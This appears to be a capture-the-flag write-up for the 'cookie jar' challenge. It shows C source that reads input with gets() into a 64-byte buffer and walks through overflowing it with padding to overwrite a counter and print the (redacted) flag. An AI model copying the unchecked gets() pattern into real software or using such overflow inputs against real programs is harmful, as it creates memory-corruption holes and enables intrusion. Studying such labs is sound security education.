# cookie jar

### Description

Try to break this Cookie Jar that was compiled from this source Once you've pwned the binary,
test it out by connecting to nc shell.angstromctf.com 1234 to get the flag.

hint: Look up some vulnerabilities associated with buffers.

### Solivng
I have the binary and the source code. First, I will try to run binary to see what am I working with:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
3
Sorry, you only had 0 cookies, try again!
<font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
jh&apos;
Sorry, you only had 0 cookies, try again!
</pre>

So, the programm asks to enter something, and after that it closes. Let's see the source code.

```C
#include <stdio.h>
#include <stdlib.h>

#define FLAG "----------REDACTED----------"

int main(int argc, char **argv){
  
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	int numCookies = 0;

	char buffer[64];

	puts("Welcome to the Cookie Jar program!\n");
	puts("In order to get the flag, you will need to have 100 cookies!\n");
	puts("So, how many cookies are there in the cookie jar: ");
	fflush(stdout);
	gets(buffer);

	if (numCookies >= 100){
		printf("Congrats, you have %d cookies!\n", numCookies);
		printf("Here's your flag: %s\n", FLAG);
	} else {
		printf("Sorry, you only had %d cookies, try again!\n",numCookies);
	}
		
	return 0;
}
```
We have two variables: numCookies and the input buffer. The vulnarability is obvious, it is the buffer overflow. The thing is for buffer allocated 64 bytes of memory 
```C 
char buffer[64]
``` 
but there is no limitation for input
```C
gets(buffer)
```
So gets function is gonna write to the memory all I enter despite the input size. But the buffer has only 64 bytes of memory, and if I enter more than 64 bytes, this function will write data into the memory of variables located after the buffer. That's what we are gonna use. The first variable located after the buffer is numCookies, so we can rewrite this variable's value, overflowing the buffer. We will enter 64 bytes and than the numCookies value we want. Let's try it:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa999
Sorry, you only had 0 cookies, try again!
</pre>

Ha! Didn't work! That was odd for me, so I decided to watch this in IDA. I opened the main function stack and noticed that for buffer there is allocated 71 bytes instead of 64. Okay, so now I need to enter 71 bytes. Trying:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa100
Sorry, you only had 48 cookies, try again!
</pre>

Didn't work again, but there are some changes, that means we've overflow the buffer. I just add one more byte to input and got the flag:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa100
Congrats, you have 12336 cookies!
Here&apos;s your flag: ----------REDACTED----------
</pre>
